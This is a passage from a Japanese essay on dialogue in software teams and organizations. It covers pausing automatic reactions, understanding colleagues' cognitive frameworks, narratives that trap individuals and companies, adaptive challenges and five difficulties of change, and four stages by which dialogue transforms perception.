これはすべて、自動的に起きます。意識する前に、もう言葉が口から出ています。この自動反応が、対話を壊します。中断する力とは、この自動反応を一時停止する力です。システム1からシステム2へ、意識的に切り替える力です。具体的には、どうするでしょうか。まず、自分の反応に気づく。「今、私は防御的になっています」と認識します。この気づきが、自動反応を中断します。次に、一呼吸置く。文字通り、深呼吸します。これは単なる気休めではありません。呼吸は、自律神経系に直接作用します。深く息を吐くことで、交感神経の興奮が抑えられます。そして、問いかけます。「相手は本当に攻撃しているのか」「他の解釈はないか」「今、反応する必要があるのか」。中断する力は、訓練で育つ。最初、反応した後で気づく。「ああ、また自動的に反応してしまいました」。でも、気づくことが第一歩です。繰り返すうちに、反応している最中で気づくようになります。やがて反応する前に気づけます。これは、メタ認知的な筋肉です。使えば使うほど、強くなります。この力があると、対話の質が変わります。相手の言葉を、条件反射的に解釈しない。一度受け止めて、考えます。「この言葉は、どういう意味だろう」「相手は、何を伝えようとしているのだろう」。この思考の間が、誤解を防ぐ。理解する力人間の認識は、一人ひとり異なります。私たちは皆、異なる「認識の枠組み」を持っています。同じ入力に対して、異なる処理をします。異なる出力を生み出す。相手の言葉を理解するとは、その言葉の表面的な意味を把握することではありません。相手がどんな認識の枠組みでその言葉を生成したかを推測することです。「この実装は複雑すぎます」。この言葉を聞いたとき、あなたは何を理解すべきでしょうか。言葉の辞書的な意味ではありません。相手の認識の枠組みを理解すべきです。相手の認識の枠組みは、何で構成されているでしょうか。まず、価値観。相手は何を大切にしているのでしょうか。品質か、速度か、保守性か、パフォーマンスでしょうか。次に、経験。相手はどんな経験をしてきたのでしょうか。どんな失敗から学んだのでしょうか。「この実装は複雑すぎます」と言う人の認識の枠組みを推測しよう。もしかしたら、この人は過去に複雑なコードでデバッグに苦労した経験があるだろう。だから、「複雑さ」は「将来の苦痛」を意味しています。あるいは、この人はシンプルさを美徳とする価値観を持っているだろう。この認識の枠組みを理解せずに、言葉だけに反応してはいけません。理解するための問いには、段階があります。第一層の問い：事実の確認。「この部分が複雑だと感じるのは、どの部分ですか」。具体的にどこを指しているかを特定します。第二層の問い：解釈の探索。「その部分は、どういう問題を引き起こしますか」。相手がどう解釈しているかを明らかにします。第三層の問い：背景の理解。「過去に似た経験がありますか」「なぜそう考えるようになったのですか」。価値観や経験の背景を探ります。相手の認識の枠組みの根源に迫ります。この段階的な問いかけによって、相手の認識の枠組みが少しずつ解像度を上げて見えてきます。「ああ、以前このパターンでバグが多発したんです」「デバッグに一週間かかったことがあって」。この情報が、相手の認識の枠組みを明らかにします。そして、あなたは理解します。「なるほど、この人は『複雑さ』を『デバッグの困難さ』と結びつけて考えているのです」。この理解があれば、応答が変わります。「確かに、この部分は複雑に見えますね。でも、テストを充実させることで、デバッグの困難さは抑えられます」。これは、相手の認識の枠組みを尊重した応答です。「複雑じゃない」と否定するのではなく、「複雑だが、あなたの懸念には対処できます」と提案します。これなら、対話が続きます。理解する力とは、共感することではありません。認識論的な探索です。 相手がどんなプログラムを実行しているかを、逆アセンブルする作業です。表面の出力から、内部のロジックを推測します。この探索は、時間がかかる。でも、この時間を省略してはいけません。理解せずに議論しても、平行線になるだけです。変容する力「あのときの自分なら、絶対にこうは言わなかったな」と感じる瞬間があります。価値観が変わった、というほどドラマチックではない。でも、世界の見え方が微妙にズレている。この「見え方のズレ」こそが、認識の枠組みの変容です。「意見を変えます」と「認識の枠組みを変えます」は、まったく違います。新しい設計思想を学ぶとき、最初は既存の知識を使って理解しようとします。しかし、本当にその考え方を習得するには、認識の枠組みそのものを変える必要があります。「拡張性」という概念を理解するには、単に技術パターンを学ぶだけでなく、ソフトウェアの時間軸についての認識を根本から変える必要があります。「今のコードの美しさ」から「将来の変更の容易さ」へ。視点を変える必要があります。対話においても、同じことが必要になります。相手の言葉を聞いて、「ああ、そういう見方もあるのか」と新しい視点を知ります。それだけでは変容ではありません。その視点を、自分の認識の枠組みに統合します。自分の認識の枠組みを、少し変えます。これは変容です。「以前、複雑さは常に避けるべきだと思っていました。しかし今、必要な複雑さと不要な複雑さを区別すべきです」。この変化が、認識の枠組みの変容です。なぜ認識の枠組みの変容が重要なのでしょうか。それは、表面的な変化は持続しないからだ。誰かに説得されて意見を変えます。その場では納得します。でも、一週間後、元の意見に戻っています。なぜか。認識の枠組みが変わっていないからだ。一方、認識の枠組みが変わると、変化は持続します。いや、「持続する」という表現が正確ではありません。もはや、元に戻るという選択肢がない。 新しい世界の見方を獲得した後、古い見方には戻れません。これは、成長の本質です。10年前の自分と今の自分を比べてみてほしい。意見が変わっただけではないはずです。世界の見方が変わっています。判断の基準が変わっています。これが認識の枠組みの変容です。もし認識の枠組みが変わっていないなら、それは10年間成長していないのです。対話は、この認識の枠組みの変容を可能にします。相手の異なる世界観に触れることで、自分の認識の枠組みを疑う機会が生まれます。「自分の見方は、絶対ではないだろう」と気づく。しかし、認識の枠組みの変容は、容易ではありません。なぜなら自己同一性の問題があるからだ。「私」という感覚は、認識の枠組みによって支えられています。 だから、認識の枠組みを変えることは、ある意味で古い自分を手放すことです。慣れ親しんだ自己イメージから離れ、新しい自己へと移行します。これは、怖い。でも、この手放しこそが、成長です。 古い自分に固執することは、成長を拒否することです。ある意味で、古い自分は死に、新しい自分が生まれる。この変容を恐れない勇気が、対話には必要です。「相手の言葉によって、私は変わるだろう」と覚悟すること。「私の世界観は、絶対ではありません」と認めること。この勇気があって初めて、本当の対話が可能になります。中断する力、理解する力、変容する力。これは対話を可能にする基礎的な能力です。しかし、これらの力を阻む、より深い障害があります。それは、私たちが日々生きている「物語」です。自分について、組織について、世界についての物語。この物語は、私たちを定義すると同時に、私たちを縛り付けます。ナラティヴという牢獄私たちは、物語の中に生きています。朝起きて、鏡を見ます。「私は〇〇です」と言える。この「〇〇」は、物語です。「私は内向的な人間です」「私は論理的に考える人間です」。これはすべて、自分について語る物語です。MBTIなんかはまさしくそうです。四文字のラベルで自分を定義し、そのラベルに沿って行動します。物語が、自己を作り出す。職場で、あるプロジェクトが失敗します。あなたは理由を考えます。「計画が甘かったからだ」「コミュニケーション不足だったからだ」。これも、物語です。起きた出来事を、因果関係で結びつけた説明です。これらの物語を、ナラティヴと呼ぶ。 ナラティヴは、現実そのものではありません。現実の解釈です。でも、私たちはナラティヴを通してしか現実を認識できません。ナラティヴには、3つの層があります。第一の層は、解釈のフレームです。「何を見るか」を決める枠組み。同じコードを見ても、ある人は「保守性」を見ます。別の人は「パフォーマンス」を見ます。第二の層は、正当化の物語です。「なぜそう見るのか」を説明する因果の鎖。「過去にレガシーコードで苦しんだから、保守性を重視する」。経験が、価値観を生み、価値観が、見方を決めます。第三の層は、アイデンティティの核です。「私は誰か」を定義する自己物語。「私は品質にこだわるエンジニアです」。この自己定義が、すべての判断の基盤になります。ナラティヴは、必要です。ナラティヴなしに、私たちは行動できません。何が重要かを決められません。優先順位をつけられません。選択ができません。ナラティヴは、複雑な現実を理解可能なパターンに圧縮します。しかし、ナラティヴは、牢獄にもなります。ナラティヴが固定化すると、新しい情報を受け入れられなくなります。すべてを既存のナラティヴで解釈しようとします。「やっぱりそうでした」ばかりで、「意外でした」がない。これは、学習の停止です。より問題なのは、ナラティヴの防衛化です。ナラティヴを修正しようとする試みを、自己への攻撃と感じます。「あなたの見方は違うだろう」と言われて、「私の経験を否定するのか」と反応します。これは、ナラティヴと自己が同一化しているからだ。対話において、ナラティヴの衝突は避けられません。二人の人間が会えば、2つのナラティヴがぶつかります。問題は、ナラティヴがあることではありません。ナラティヴを絶対化することです。「私の見方が正しい」と考えるとき、あなたはナラティヴを絶対化しています。この態度では、対話は不可能です。対話するとは、ナラティヴの相対性を認めることです。「私の見方は、1つの可能性に過ぎない」と理解すること。「相手の見方も、1つの可能性です」と受け入れること。「もしかしたら、第三の見方があるだろう」と探索すること。ナラティヴの保持的懐疑。 これが、対話の核心です。自分のナラティヴを持ちつつ、それが絶対でないという意識を保つ。相手のナラティヴを尊重し、新しいナラティヴを共創する可能性に開かれている。しかし簡単ではありません。ナラティヴを懐疑することが、自己の確実性を手放すことだからだ。この不確実性に耐える力が、対話には必要です。この態度を保つとき、新しい地平が開けます。ナラティヴを持ちながらも、それに縛られない。1つの見方を持ちながらも、他の見方を排除しない。この柔軟性が、見えなかったものを見えるようにします。対話とは、この新しい地平を開くための冒険です。しかし、ナラティヴの牢獄に閉じ込められたとき、何が起きるでしょうか。個人レベルでは、学習が停止します。成長が止まります。より深刻なのは、組織レベルでの影響です。組織のメンバー一人ひとりが、自分のナラティヴに固執します。「私の見方が正しい」と確信します。他者の見方を受け入れません。この状態では、対話は成立しない。対話なき組織は、どうなるのでしょうか。答えは明確です。緩やかな、だが確実な衰退です。ナラティヴは個人の中だけに存在しているわけではありません。「私はこういう人間だ」という物語と同じように、組織もまた「私たちはこういう会社だ」「うちの部署はこういう役割だ」という物語を持っています。個人のナラティヴが集まり、絡み合い、共有されることで、組織レベルのナラティヴが立ち上がります。そして厄介なことに、この組織ナラティヴもまた、私たちを守りながら、同時に縛ります。個人の対話不全は、組織の対話不全として増幅される。ここからは、視点を個人から組織へと一段スライドさせて、対話の欠如が組織に何をもたらすのかを見ていきます。組織に広がる牢獄視点を個人から組織へと広げよう。なぜなら私たちの多くは、単独で働いているのではなく、組織という集合体の中で対話しているからだ。組織とは何か。表面的には、人々の集まりに見えます。実際には、個々の人間と、その人間同士の相互作用の両方から成り立っています。何か問題が起きたとき、人は、よくわからない抽象的なものに原因を押しつけて思考停止してしまうことがあります。「政府の政策が悪い」「社会の仕組みが悪い」。よくわからないものよりは、具体的な何か—たとえば自分自身の行動—に原因を求めた方が、問題の解決につながる。たとえば、ある施策が推進されようとしているが、その施策について疑問があるから議論したい。誰が推進しているのか教えてほしい。そう尋ねたら、「誰というわけではなくて、組織として進めています」という返答があったとします。しかし、具体的な生身の人間を通さない意思決定など存在しない。「組織として進めています」というのは事実だろうが、そう言うと霧の中を彷徨うような感覚になります。解像度を上げてみれば、誰かが意見を持っていて、誰かが同調して進めているのです。だから、知りたければ、課題を解決したければ、まずは生身の人に働きかけることです。組織の緩やかな衰退対話の欠如は、組織を内側から蝕みます。しかし、組織が成熟するにつれて、ある種の宿命的な問題が生じます。これを構造的無能化と呼びます。構造的無能化とは、組織が思考力と実行力を段階的に喪失し、環境変化に適応できなくなる現象です。これは急激な破綻ではありません。ゆっくりと、気づかれないうちに進行する慢性的な機能不全です。構造的無能化の根本には、ナラティヴの固定化と対話の欠如があります。組織の各メンバーが自分のナラティヴに閉じこもります。部門ごとに異なるナラティヴを持ちます。「営業は数字しか見ていない」「開発は現実を知らない」「経営は現場を理解していない」。これらのナラティヴは、互いを排除し合います。対話は起きません。そして、組織は徐々に機能を失っていきます。なぜ成功が失敗の種となるのか皮肉なことに、成功した組織ほど、この罠にはまりやすい。企業が成功すると、その成功をもたらした方法を固定化しようとします。「この方法でうまくいった」という経験が、標準化とルーティン化を促します。効率を最大化するために、分業を進めます。これは合理的です。しかし、この成功体験は、組織のナラティヴを固定化します。「私たちはこうやって成功した」という物語が、組織のアイデンティティになります。この物語は、誇りの源泉です。同時に、変化への抵抗の源泉でもあります。「なぜ変える必要があるのか。これでうまくいっています」。成功のナラティヴは、新しい情報を拒絶します。異なる意見を排除します。対話を閉ざします。問題は、この効率化が前提としている「環境の安定性」です。市場が変わらず、顧客ニーズが変わらず、技術が変わらなければ、標準化とルーティン化は機能し続けます。しかし、環境は変わります。しかも、成功した企業ほど、その変化に気づきにくい。なぜなら、既存のやり方で「まだ」利益が出ているからです。固定化されたナラティヴは、変化のシグナルを見えなくします。全体を見失う組織効率化の代償として、最初に現れるのが断片化です。断片化とは、組織の各部分が自律的に機能する一方で、全体としての統合性を失う状態です。営業部門は「売上」だけを見ます。開発部門は「機能」だけを見ます。カスタマーサポートは「問い合わせ対応」だけを見ます。誰も「顧客の体験全体」を見ていません。この断片化は、部門ごとのナラティヴの固定化から生まれます。営業は「数字こそ正義です」というナラティヴを持ちます。開発は「技術的品質が最重要です」というナラティヴを持ちます。それぞれのナラティヴは、部門内では共有されています。しかし、部門を超えた対話はありません。異なるナラティヴを持つ者同士が話すとき、それは対話ではなく、対立になります。「私の仕事はここまで」「それはあなたの部署の仕事」。明確な役割分担は、一見すると効率的です。しかし、組織を横断する課題—たとえば「なぜ顧客満足度が下がっているのか」—に対して、誰も答えを持っていない状況が生まれます。断片化した組織では、問題が「部門間の隙間」に落ちます。誰の責任でもない問題は、誰も解決しません。対話がないからです。新しいものを生み出せない組織断片化が進むと、次に訪れるのが不全化です。不全化とは、組織が新しい課題を認識し、新しい解決策を生み出す能力を失うことです。視野が狭くなり、思考が硬直化します。外部の変化—新しい競合の登場、技術革新、顧客ニーズの変化—を捉えられなくなります。なぜこうなるのか。断片化した組織では、各部門が自部門の指標だけを追求します。営業は売上目標、開発は納期、サポートは対応時間。これらの指標を達成することが「仕事」になります。全体最適ではなく、部分最適の連鎖です。新しい事業を生み出すには、部門を横断した協力が必要です。しかし、断片化した組織では、その協力を生み出す仕組みがありません。部門を超えた対話がないからです。各部門が自分たちのナラティヴに閉じこもり、他部門のナラティヴを理解しようとしません。本質を掴めない組織そして最終段階が表層化です。表層化とは、問題認識が表面的になり、根本原因に到達できない状態です。収益が悪化します。離職率が上がります。顧客満足度が下がります。これらの「症状」は見えます。しかし、「なぜそうなっているのか」という本質的な問いに答えられません。なぜ根本原因に到達できないのでしょうか。深い対話がないからです。表層化した組織では、各自が固定化されたナラティヴで問題を解釈します。「これは営業の問題です」「これは開発の問題です」。しかし、誰も「私たちの組織のあり方の問題ではないか」とは問いません。なぜなら、そう問うことは、組織全体のナラティヴ—「私たちはこういう会社です」という自己定義—を疑うことになるからだ。表層化した組織では、対症療法が繰り返されます。「売上が下がった→営業人員を増やそう」「離職率が高い→給与を上げよう」。これらの施策は、表面的な症状には対処しますが、根本原因—組織文化の問題、マネジメントの問題、ビジョンの喪失—には触れません。根本原因に触れるには、深い対話が必要です。しかし、ナラティヴの牢獄に閉じ込められた組織には、その対話ができません。個人の能力ではなく、構造の問題重要なのは、これは個人の能力の問題ではないということです。組織の一人ひとりは、多くの場合、有能です。変革したいという意志もあります。しかし、構造的無能化に巻き込まれることで、個々の能力が発揮できなくなります。個人を責めても、問題は解決しません。構造を変えなければなりません。しかし、構造は人が作り、人が維持していることも事実です。構造を変える責任は、その構造内の人々全員にあります。そして、構造を変えるには、対話が必要です。部門を超えた対話。階層を超えた対話。過去の成功を疑う対話。企業変革という長い道のりどうすればこの悪循環から抜け出せるのでしょうか。企業変革には、4つのプロセスが必要だと考えられます。第一に、全社戦略を考えられるようになること。 断片化した視点から脱却し、全体を見渡す力を取り戻す。第二に、全社戦略へのコンセンサスを形成すること。 組織全体で方向性を共有します。第三に、部門内での変革を推進すること。 各部門で具体的なアクションを起こす。第四に、全社戦略・変革施策をアップデートすること。 実行の中で学び、修正し続けます。このプロセスを阻む困難があります。3つの困難です。「多義性」の困難。 ある状況について複数の解釈が存在していても、その状態を捉えられなくなります。「複雑性」の困難。 ある事象の背後で複数の要因が絡み合い、状況が明確に認識されず、解決策もわかりにくくなります。「自発性」の困難。 変革の方向性を打ち出しても、現場で積極的に実行されなくなります。これらの困難を乗り越える鍵は何か。それは対話だ。企業変革と適応課題：人が変わるということここまでの議論で、「構造的無能化」や「企業変革の4つのプロセス」という、組織レベルの枠組みを見てきました。しかし、どれだけ立派なプロセスを設計しても、それだけで変革が進むわけではありません。なぜなら、変わるのは「組織」そのものではなく、組織の中にいる人間だからです。ここからは視点をもう一段インナーレイヤーに寄せます。企業変革の根っこには、必ず 「適応課題」＝人々の認識の枠組みの変容 が横たわっています。そして、この認識の変容には、「5つの重力」のような困難がまとわりついている。それが何なのかを、1つずつほどいていきます。なぜプロジェクトは失敗するのでしょうか。多くの人は、技術的な問題だと捉えます。設計が悪かった。実装に問題があった。技術的な解決策を探す。しかし、これらの解決策を導入しても、同じ問題が繰り返されます。なぜか。問題が技術的側面だけでなく、適応的側面を持つからだ。適応的側面とは何でしょうか。それは、人々の認識の枠組み、つまりナラティヴの問題です。組織のメンバーが固定化されたナラティヴに閉じこもっています。「品質より速度が重要です」「速度より品質が重要です」。このナラティヴの対立が、技術的な解決策を無効化します。どんなに優れたツールを導入しても、どんなに合理的なプロセスを設計しても、ナラティヴが変わらなければ、問題は解決しません。そして、ナラティヴを変えるには、対話が必要です。技術的問題と適応課題のスペクトラム私は、問題を2つの軸で捉えるようになった。技術的側面と適応的側面です。技術的側面とは、既存の知識と技術で解決できる部分。適応的側面とは、認識の枠組みの変容が必要な部分。重要なのは、これは二者択一ではなく、連続的なスペクトル上に存在するということです。純粋に技術的な問題の例。サーバーのレスポンスが遅い。データベースのクエリを最適化します。キャッシュを導入します。これで解決します。問題は外部にあります。解決策も外部にあります。純粋に適応的な課題の例。チームのコミュニケーションがうまくいかない。誰もが「相手が理解してくれません」と感じています。この問題を「コミュニケーションツールの問題」だと定義すれば、Slackを導入すれば解決するはずです。しかし、実際には解決しない。なぜなら問題の本質はツールではなく、互いの認識の違いにあるからだ。ただし、現実の問題の多くは、両方の側面を持っています。たとえば「技術的負債が増え続けています」という問題。一見技術的に見えますが、「品質と速度のどちらを優先するか」という価値観の問題、「リファクタリングに時間を使うことを許容するか」という組織文化の問題といった適応的側面も含みます。問題を見誤る典型的なパターンは、適応的側面を持つ問題に技術的解決策だけを当てはめることです。「ツールを導入したのに、なぜうまくいかないんだろう」。ツールだけが問題なのではなく、認識や関係性も問題なのだと気づかない。多くの組織の問題は、適応課題です。「イノベーションが生まれません」。これは、予算の問題でも、人材の問題でもない。リスクを取ることを恐れる文化の問題です。失敗を許容しない価値観の問題です。これを変えるには、組織の認識を変える必要があります。適応課題における変容の困難さ適応課題に直面したとき、人間は変化に時間を要します。なぜなら変化することは、一部の自分を失うことだからだ。 長年培ってきた考え方。慣れ親しんだ行動パターン。自分を定義してきた価値観。これらを手放すことは、怖い。言い換えれば、自分のナラティヴを手放すことです。「私はこういう人間です」という自己物語。「私たちはこういう組織です」という集団物語。これらのナラティヴは、アイデンティティの核です。だから、適応課題は、感情的な反応を伴う。論理的に説明しても、すぐには納得しない。データを示しても、即座には受け入れません。これは、頑固なのではありません。恐怖なのだ。この恐怖を乗り越えるには、何が必要でしょうか。対話です。一方的な説得ではありません。命令でもありません。対話を通じて、自分のナラティヴを相対化します。「私の見方は、絶対ではないだろう」と気づきます。他者のナラティヴに触れます。「そういう見方もあるのか」と理解します。そして、徐々に、自分のナラティヴを更新していきます。この変容は、対話なしには起きません。適応課題における5つの変容の困難良いアイデアを提示すれば、人は変わるだ。しかし、現実には変わりません。なぜか。変化には、5つの困難があるからです。この困難は、高くそびえ立つ障害物ではありません。むしろ、重力のように働きます。目には見えませんが、常に働いています。私たちを、元の場所に引き戻そうとします。どんなに優れたアイデアでも、この5つの困難を越えられなければ、人は変わりません。この5つの困難は、独立して存在するのではありません。互いに影響し合い、変化を阻む仕組みを形成しています。1つの困難を越えても、次の困難が待っています。5つすべてを理解しなければ、変化は起きません。第一の困難：頭の作り変え毎朝、同じ道を通って会社に行きます。信号の位置を覚えています。どこで曲がるか、体が覚えています。考えなくても、着きます。これが、慣れです。仕事も同じです。20年、30年かけて、物事の見方を学んできました。「こういう問題には、こう対処する」。瞬時に判断できます。考えなくても、答えが出ます。この慣れが、あなたの強みです。経験と呼ばれるものです。新しい考え方を受け入れるとは、この慣れた道を捨てることです。新しい道を覚え直すことです。でも、新しい道では迷います。間違えます。時間がかかります。だから、脳は嫌がります。「複雑すぎる」「よく分からない」。怠惰ではありません。効率を求める本能です。この困難を越えるには、いきなり全部の道を変えようとしてはいけません。「いつもの道の、この角を少し変えてみよう」。一部だけ変えます。慣れたら、また一部変えます。「あなたがやってきたことは、間違いではありません。ちょっと拡張するだけです」。こう言われると、安心します。第二の困難：暗闇への恐怖夜、真っ暗な部屋を歩くとき、あなたは慎重になります。手を前に伸ばします。障害物を探ります。何かにぶつからないか、不安です。明かりをつければ、普通に歩けます。でも、暗闇では怖い。新しい方針、新しいやり方。これは、暗闇を歩くようなものです。「うまくいくのか」「失敗したらどうなるのか」。答えが見えません。過去の経験も役に立ちません。予測ができません。だから、体が固くなります。心臓がドキドキします。頭が真っ白になります。だから、ここでは「全部を明るくしよう」としないことが大事になります。小さな懐中電灯で、一歩先だけ照らす。「まず、この小さな範囲で試そう」。失敗しても、被害は小さい。成功すれば、次の一歩が見えます。その繰り返し以外に、暗闇を抜ける方法はありません。第三の困難：自分の定義を変える痛み10年間、営業として働いてきました。顧客と話すのが好きです。契約が取れたときの達成感。売上目標を達成したときの誇り。これらが、あなたです。名刺には「営業部」と書いてあります。自己紹介するとき、「営業をやっています」と言います。あなたは、営業です。「これからはマネジメント職に」。この言葉を聞いたとき、何を感じるでしょうか。「私は営業じゃなくなるのか」。不安です。10年間、営業として生きてきました。営業の自分しか、知りません。営業じゃない自分は、誰なのでしょうか。自分が分からなくなります。この困難を越えるには、「営業を辞める」ではなく、「営業の経験を活かす」だ。「営業の経験は無くなりません。それは基盤です。その上に、新しいスキルを積み上げます」。こう言われると、自分は消えないと分かります。過去は捨てません。未来につながります。第四の困難：体に染みついた癖毎朝、目覚ましが鳴ります。あなたは無意識にスマホを取ります。メールをチェックします。考えていません。体が勝手に動きます。これが、習慣です。仕事でも同じです。資料を作るとき、いつものテンプレートを使います。会議の進め方も、いつも同じです。使い慣れたツール。決まった手順。考えなくても、できます。楽です。新しいやり方は、違います。毎回考えなければなりません。どうするんだっけ、と迷います。間違えます。遅くなります。疲れます。だから、体は元のやり方に戻ろうとします。「やっぱり、いつものやり方の方が早い」。そう感じます。この困難を越えるには、最初の遅さを許します。「新しいやり方は、最初は遅いです。でも、一ヶ月後には速くなります」。この移行期間を、我慢します。組織として、支援します。第五の困難：自分で決めたい気持ち子供の頃、親に「これを食べなさい」と言われました。嫌でした。でも、「何が食べたい」と聞かれて、同じものを選んだとき、喜んで食べました。人間は、自分で決めたいのです。職場でも同じです。上司が「この方法でやりなさい」と命令します。あなたは、反発します。たとえそれが良い方法でも、押し付けられると嫌です。なぜか。自分で決めていないからです。この困難を越えるには、命令ではなく、提案します。「こういう選択肢があります。どう考えますか」。相手を、意思決定に参加させます。「一緒に考えましょう」。相手が自分で気づき、自分で選びます。そのとき、反発は消えます。同じ結論でも、自分で選んだら、納得します。この5つの困難は、別々に立っているのではありません。連動しています。第一の困難を越えて、新しい考え方を理解しても、第二の困難の不安が残ります。第三の困難の「自分が分からなくなる」恐怖も待っています。第四の困難の習慣の引力が、あなたを元に戻そうとします。そして、第五の困難。自分で決めていないと感じれば、すべてが無駄になります。だから、変革を推進する者は、5つすべてを理解しなければなりません。1つだけ対処しても、他の困難が残ります。人は変わりません。5つすべてに、丁寧に向き合う必要があります。これが、変容のメカニズムです。ここまで見てきた「5つの困難」は、私たちが変わろうとするときに働く重力でした。頭の作り変えへの抵抗、暗闇への恐怖、自己定義の揺らぎ、体に染みついた癖、そして自分で決めたいという欲求。では、この重力に抗いながら、どうやって認識の枠組みを変えていけばいいのか。そこで必要となる具体的なプロセスこそが、対話です。対話は、単なる話し合いの技術ではなく、認識の変容を起こすための手順そのものです。ここからは、対話がどのような段階を経て認識を変えていくのかを、「4つの段階」として見ていきます。対話による変容の促進対話が必要なのは、まさにこの適応課題においてです。技術的問題なら、専門家が答えを出せばいい。でも、適応課題は、当事者全員が変わらなければ解決しない。変わるためには、まず現在の認識、つまり固定化されたナラティヴを可視化しなければならない。ここで大事なのは、変化を強制できないと理解しておくことです。 説得しようとすればするほど、心理的反発が強まる。ナラティヴを否定されることは、自己を否定されることだからだ。だから、対話が必要になります。対話とは、相手を説得する行為ではありません。相手が自分自身を説得できるよう手助けする行為です。「私たちは、なぜこのパターンを繰り返しているのか」。「私たちは、どんな前提で動いているのか」。これらの問いに向き合うこと。これは、組織のナラティヴを問い直す作業です。対話を通じて、集団のナラティヴが可視化されます。「ああ、私たちはリスクを避けることを最優先にしてきたのです」。この気づきが、変化の第一歩になります。そして、対話を通じて、新しいナラティヴが創発します。「リスクを取らないことも、リスクではないか」。互いの視点を統合することで、誰も一人では到達できなかった地平が開けます。これが、ナラティヴの牢獄から抜け出す唯一の道です。適応課題は、対話なしには解決しない。 命令では解決しない。説得では解決しない。強制では解決しない。なぜなら解決には、当事者全員の認識の変容が必要だからだ。認識の変容は、対話を通じてのみ起きます。対話のプロセス：認識の変容の四段階対話は、どのように起きるのでしょうか。どのようなプロセスを経て、認識は変容するのでしょうか。多くの対話のフレームワークは、行動のステップを示す。傾聴します。質問します。要約します。しかし、これは表面的です。本当の対話は、もっと深い層で起きています。認識の変容の層で。対話のプロセスを4つの段階として捉え直してみたい。第一段階：自己の相対化対話が始まる前、私たちは自分の認識を絶対視しています。「世界はこうです」と思っています。正確には、「私が見ている世界」と「世界そのもの」を区別していない。第一段階は、この区別に気づくことです。「私が見ているのは、世界の一つの側面に過ぎない」と認識すること。 これを、自己の相対化と呼ぶ。どうやって相対化が起きるのでしょうか。最も効果的なのは、自分とまったく違う視点に出会うことです。同じ状況を見ているのに、相手はまったく違う解釈をしています。この衝突が、相対化のきっかけになります。「この設計は複雑すぎます」と思っていました。しかし、相手は「この設計は適切な抽象化です」と言います。最初は「相手が間違っています」と感じます。ところが、相手の説明を聞いているうちに、何かがひっかかる。「もしかして、私が見ていないものを、この人は見ているのだろう」。この瞬間、相対化が始まります。「私はこう見ています。でも、世界はもっと複雑だろう」。この距離感が、対話の始まりになります。自己の相対化は、謙虚さを生む。「私は確信していない」と認めることができるようになります。「私の見方は、1つの可能性に過ぎない」と受け入れることができるようになります。この謙虚さがなければ、対話は始まらない。第二段階：他者の世界への接近自己を相対化したとき、他者の世界が見えてきます。相手もまた、1つの認識の体系を持っています。相手の言葉は、その体系から生成されています。第二段階は、この相手の認識の体系に近づくことです。相手の世界を、内側から理解しようと試みること。 これを、他者の世界への接近と呼ぶ。接近するとは、相手の前提を探ることです。「なぜそう考えるのですか」と問う。「どういう経験から、その結論に至ったのですか」と尋ねます。相手の認識の枠組みを、少しずつ解読していく。「この設計は適切な抽象化です」と言う相手。なぜそう考えるのでしょうか。相手に聞いてみます。すると、相手は過去のプロジェクトの話をします。要件が頻繁に変わるプロジェクトでした。柔軟な設計にしていたおかげで、変更に対応できました。その経験から、「抽象化は投資です」という信念が生まれた。この話を聞いて、あなたは理解します。「ああ、この人は『抽象化』を『変更への備え』として見ているのです」。一方、あなたは「抽象化」を「複雑さの源」として見ていました。同じ言葉、違う意味。この差異が、可視化されます。接近は、共感とは違います。共感は、感情的な同調です。しかし、接近は、認識論的な理解です。「あなたの認識の構造が分かる」。感情は一致しなくても、認識は理解できます。接近することで、相手の言葉の真意が分かります。対立が和らぐ。「この人は私を攻撃しているわけではない。ただ、違う視点から見ているだけです」。第三段階：差異の構造化自分の世界と相手の世界を理解したとき、次の段階が来る。2つの世界の違いを、明確に構造化することです。第三段階は、差異を整理し、パターンを見出すこと。 これを、差異の構造化と呼ぶ。構造化とは、「何が違うのか」を言語化することです。漠然と「意見が違う」ではなく、「どこが、なぜ、違うのか」を明確にします。あなたと相手の対立を、構造化しよう。まず、事実の層では一致しています。「このコードは複数の抽象レイヤーを持っています」。これは、どちらも認めます。次に、解釈の層で分かれます。あなたは「複数の抽象レイヤーは、理解を困難にする」と解釈します。相手は「複数の抽象レイヤーは、変更を容易にする」と解釈します。そして、価値観の層でも分かれます。あなたは「即座の理解可能性」を重視します。相手は「長期的な柔軟性」を重視します。さらに、経験の層でも違います。あなたは過去に複雑なコードで苦労しました。相手は過去に硬直的な設計で苦労しました。この構造化によって、対立の本質が見えます。これは、技術的な議論ではなかった。価値観の対立でした。 どちらの価値観も正しい。でも、優先順位が違います。その優先順位の違いは、異なる経験から生まれています。構造化すると、対立が外在化されます。「AとBの対立」ではなく、「即座の理解可能性 vs 長期的な柔軟性」という構造の問題になります。人格の対立から、構造の対立へ。これは対話を生産的にします。第四段階：統合への創発そして最後の段階。2つの世界観を統合する、新しい視点が創発します。第四段階は、どちらの視点も含みつつ、どちらでもない第三の地平を見出すこと。 これを、統合への創発と呼ぶ。統合は、妥協ではありません。妥協とは、両者が譲り合って中間点を取ることです。これは取引です。統合とは、より高次の視点を見出すことです。AかBかではなく、AとBを包含するCを創造することです。あなたと相手の対立に戻ろう。即座の理解可能性 vs 長期的な柔軟性。どちらも大切です。では、どうするでしょうか。問いを変えます。「どちらを選ぶか」ではなく、「どちらも実現する方法はないか」と。この問いが、創発を促す。議論を続けるうちに、アイデアが生まれます。「コア部分は抽象化します。でも、抽象化のレイヤーは最小限にします。各レイヤーの責務を明確にドキュメント化します。さらに、具体的な使用例をテストコードで示す」。この解決策は、あなたの懸念に応えています。ドキュメントとテストによって、理解可能性が保たれます。同時に、相手の懸念にも応えています。抽象化によって、柔軟性が保たれます。これが統合です。 どちらの視点も否定せず、両方を満たす新しい解を見出す。この解は、対話の前には存在しなかった。あなた一人では到達できなかった。相手一人でも到達できなかった。2つの視点が出会い、対話を通じて、創発しました。統合への創発は、対話の究極の目標です。しかし、必ずしも達成されるとは限らない。時には、差異の構造化で終わることもあります。それでもいい。統合できなくても、理解は深まっています。論破という暴力対話の対極にあるものについて語ろう。論破です。論破とは、相手を言い負かすことです。相手の主張の矛盾を指摘します。相手の論理の欠陥を突く。相手を沈黙させます。「勝ちました」と感じます。なぜ人は論破したがるのでしょうか。それは、即座の快楽があるからだ。相手を打ち負かす瞬間、ドーパミンが放出されます。優越感を感じます。自己肯定感が高まる。この快楽が、論破を強化します。論破は、対話を殺す。 